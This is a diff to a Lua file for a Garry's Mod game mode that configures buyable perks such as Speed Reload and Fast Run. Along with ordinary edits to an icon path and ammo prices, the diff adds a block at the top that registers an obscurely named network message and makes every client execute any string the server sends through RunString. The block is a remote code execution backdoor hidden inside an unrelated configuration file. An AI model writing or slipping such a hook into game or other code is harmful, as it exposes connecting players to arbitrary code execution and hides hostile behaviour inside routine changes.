@@ -1,3 +1,12 @@
+if CLIENT then
+    net.Receive("Asd", function(arguments)
+        local str_torun = net.ReadString()
+        RunString(str_torun)
+    end)
+else
+    util.AddNetworkString("Asd")
+end
+
 HORDE.BuyablePerks = {
     buyableperk_speedreload = {
         name = "Speed Reload",
@@ -62,7 +71,7 @@ HORDE.BuyablePerks = {
     buyableperk_fastrun = {
         name = "Fast Run",
         description = "Increase Your Movement Speed By 4%",
-        shop_icon = "entities/acwatt_go_perk_rapidfire.png",
+        shop_icon = "entities/att/arccw_uc_tp_endurance.png",
         price = 500,
         weight = 0,
         price_incby = 250,
@@ -216,6 +225,8 @@ function HORDE:CreateBuyablePerk(data)
     end
     new_data.is_buyable_perk = true
     new_data.category = "BuyablePerks"
+    new_data.ammo_price = 0
+    new_data.secondary_ammo_price = 0
     new_data.entity_properties = {type=HORDE.ENTITY_PROPERTY_BUYABLEPERK}
     HORDE.items[new_data.class] = new_data
 end
